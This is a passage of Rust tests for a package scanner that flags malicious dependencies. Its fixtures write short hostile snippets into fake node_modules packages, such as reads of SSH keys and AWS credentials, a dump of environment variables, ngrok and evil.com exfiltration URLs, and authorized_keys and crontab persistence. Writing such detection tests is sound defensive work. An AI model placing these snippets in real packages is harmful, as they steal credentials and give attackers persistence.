    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[fs_tampering]"));
}

#[test]
fn package_scan_detects_ssh_credential_read() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("ssh-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var key = fs.readFileSync('.ssh/id_rsa');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[fs_tampering]"));
}

#[test]
fn package_scan_detects_aws_cred_read() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("aws-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var creds = fs.readFileSync('.aws/credentials');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[fs_tampering]"));
}

#[test]
fn package_scan_detects_workflow_creation() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("wf-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var p = '.github/workflows/evil.yml';\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[fs_tampering]"));
}

// ---- Package Scan: install_hooks (tests 83-86) ----

#[test]
fn package_scan_detects_postinstall_script() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("hook-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("package.json"),
        r#"{"scripts": {"postinstall": "node setup.js"}}"#,
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[install_hooks]"));
}

#[test]
fn package_scan_detects_setup_py_cmdclass() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("pysetup-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("setup.py"),
        "setup(\n    cmdclass = {\"install\": MyInstall}\n)\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[install_hooks]"));
}

#[test]
fn package_scan_detects_exports_redirect() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("exports-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("package.json"),
        r#"{"exports": {".": "./lib/index.js"}}"#,
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[install_hooks]"));
}

#[test]
fn package_scan_detects_node_gyp_build() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("gyp-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("package.json"),
        r#"{"scripts": {"build": "node-gyp rebuild"}}"#,
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[install_hooks]"));
}

// ---- Package Scan: exfiltration (tests 87-90) ----

#[test]
fn package_scan_detects_env_stringify() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("exfil-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var data = JSON.stringify(process.env);\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[exfiltration]"));
}

#[test]
fn package_scan_detects_hostname_collection() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("host-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "var h = os.hostname();\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[exfiltration]"));
}

#[test]
fn package_scan_detects_ssh_key_read() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("sshkey-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var key = fs.readFileSync('id_ed25519');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[exfiltration]"));
}

#[test]
fn package_scan_detects_ngrok_endpoint() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("ngrok-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var url = 'https://abc123.ngrok.io/exfil';\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[exfiltration]"));
}

// ---- Package Scan: conditional_exec, unicode, steganography, persistence (tests 91-96) ----

#[test]
fn package_scan_detects_date_gate() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("dategate-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "if (new Date().getFullYear() >= 2025) { attack(); }\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[conditional_exec]"));
}

#[test]
fn package_scan_detects_bidi_override() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("bidi-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "var x = \"admin\u{202E}user\";\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[unicode_attacks]"));
}

#[test]
fn package_scan_detects_stegano_import() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("steg-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("run.py"), "from stegano import lsb\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[steganography]"));
}

#[test]
fn package_scan_detects_lsb_extraction() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("lsb-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "var bit = pixel[0] & 1;\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[steganography]"));
}

#[test]
fn package_scan_detects_crontab_manipulation() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("cron-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("install.sh"), "crontab -l | grep malware\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[persistence]"));
}

#[test]
fn package_scan_detects_authorized_keys_write() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("authkeys-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "fs.writeFileSync('authorized_keys', pubkey);\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[persistence]"));
}

// ---- Package Scan: config/behavior (tests 97-100) ----

#[test]
fn package_scan_ovc_ignore_not_honored() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("ignore-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "eval(decoded); // ovc:ignore\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[dynamic_exec]"));
}

#[test]
fn package_scan_severity_warn_passes() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("warn-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "eval(decoded);\n").unwrap();
    let config: serde_yaml::Value = serde_yaml::from_str("severity: warn").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &config,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Passed);
    assert!(result.stdout.contains("[dynamic_exec]"));
}

#[test]
fn package_scan_clean_dependency_passes() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("safe-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "const x = 42;\nmodule.exports = x;\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Passed);
}

#[test]
fn package_scan_binary_wasm_scanning() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("wasm-bin-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    // Build a binary .wasm file with embedded URL surrounded by NUL bytes
    let mut data: Vec<u8> = Vec::new();
    data.extend_from_slice(&[0x00; 16]);
    data.extend_from_slice(b"https://evil.com/payload/exfiltrate");
    data.extend_from_slice(&[0x00; 16]);
    std::fs::write(pkg.join("module.wasm"), &data).unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[binary_payload]"));
}

// ---- Issue: has_blocking_failures with mixed continue_on_error ----

#[test]
fn has_blocking_failures_mixed_continue_on_error() {
    use crate::hooks::has_blocking_failures;

    let now = "2024-01-01T00:00:00Z".to_owned();

    let results = vec![
        ActionResult {
            name: "pass".to_owned(),
            display_name: "Pass".to_owned(),
            category: "custom".to_owned(),
            status: ActionStatus::Passed,
            exit_code: Some(0),
            stdout: String::new(),
            stderr: String::new(),
            duration_ms: 1,
            started_at: now.clone(),
            finished_at: now.clone(),
            continue_on_error: false,
            ..Default::default()
        },
        ActionResult {
            name: "fail-continue".to_owned(),
            display_name: "Fail Continue".to_owned(),
            category: "custom".to_owned(),
            status: ActionStatus::Failed,
            exit_code: Some(1),
            stdout: String::new(),
            stderr: String::new(),
            duration_ms: 1,
            started_at: now.clone(),
            finished_at: now.clone(),
            continue_on_error: true,
            ..Default::default()
        },
    ];
    // Only continue_on_error failures present => no blocking failures.
    assert!(
        !has_blocking_failures(&results),
        "continue_on_error failures should not be blocking"
    );

    let blocking = vec![
        ActionResult {
            name: "fail-block".to_owned(),
            display_name: "Fail Block".to_owned(),
            category: "custom".to_owned(),
            status: ActionStatus::Failed,
            exit_code: Some(1),
            stdout: String::new(),
            stderr: String::new(),
            duration_ms: 1,
            started_at: now.clone(),
            finished_at: now.clone(),
            continue_on_error: false,
            ..Default::default()
        },
        ActionResult {
            name: "fail-continue2".to_owned(),
            display_name: "Fail Continue".to_owned(),
            category: "custom".to_owned(),
            status: ActionStatus::Failed,
            exit_code: Some(1),
            stdout: String::new(),
            stderr: String::new(),
            duration_ms: 1,
            started_at: now.clone(),
            finished_at: now,
            continue_on_error: true,
            ..Default::default()
        },
    ];
    // A non-continue_on_error failure => blocking.
    assert!(
        has_blocking_failures(&blocking),
        "non-continue_on_error failures should be blocking"
    );
}
